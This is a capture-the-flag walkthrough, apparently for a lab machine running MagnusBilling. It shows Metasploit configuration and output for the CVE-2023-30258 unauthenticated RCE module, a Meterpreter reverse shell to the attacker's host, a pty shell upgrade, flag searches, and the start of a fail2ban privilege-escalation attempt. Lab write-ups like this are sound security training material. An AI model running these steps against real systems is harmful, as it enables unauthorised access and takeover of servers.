On the first look it looks like some billing site?

It redirects here on the `/billing` directory

Suru ma ta nmap hannai paryo

we used `msfconsole` to find exploit modules related to `magnus billing`  then we found some and after setting up the `rhosts, lport, lhost` we then ran the exploit number listed as 0

```jsx
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > options

Module options (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                         ort][...]
   RHOSTS     10.10.163.249    yes       The target host(s), see https://docs.metasploit.com
                                         /docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is random
                                         ly generated)
   TARGETURI  /mbilling        yes       The MagnusBilling endpoint URL
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                       s must be an address on the local machine or 0.0.0.0
                                       to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

   When TARGET is 0:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   WEBSHELL                   no        The name of the webshell with extension. Webshell na
                                        me will be randomly generated if left unset.

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.17.19.181     yes       The listen address (an interface may be specified)
   LPORT  6969             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   PHP

msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > exploit
[-] Handler failed to bind to 10.17.19.181:6969:-  -
[-] Handler failed to bind to 0.0.0.0:6969:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:6969).
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > exploit
[*] Started reverse TCP handler on 10.17.19.181:6969 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.163.249:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 4 seconds.
[*] Elapsed time: 4.69 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.10.163.249
[+] Deleted RHqwNOooFJ.php
[*] Meterpreter session 1 opened (10.17.19.181:6969 -> 10.10.163.249:53540) at 2025-06-03 23:01:31 +0545

meterpreter > 
[*] 10.10.163.249 - Meterpreter session 1 closed.  Reason: Died

```

ani we got a reverse shell?

so i used `shell`

and then we got a pretty shell using python

`python -c "import pty; pty.spawn('/bin/bash/')"`

and then we find the `user.txt` file using find

`find / -name user.txt -type f 2>/dev/null`

and we try similarly for root.txt

we don’t have the reqd privilege so we first check what we can run using `sudo -l`

and we find the `fail2ban` client 

we then try to escalate privilege to root so we try the `fail2ban`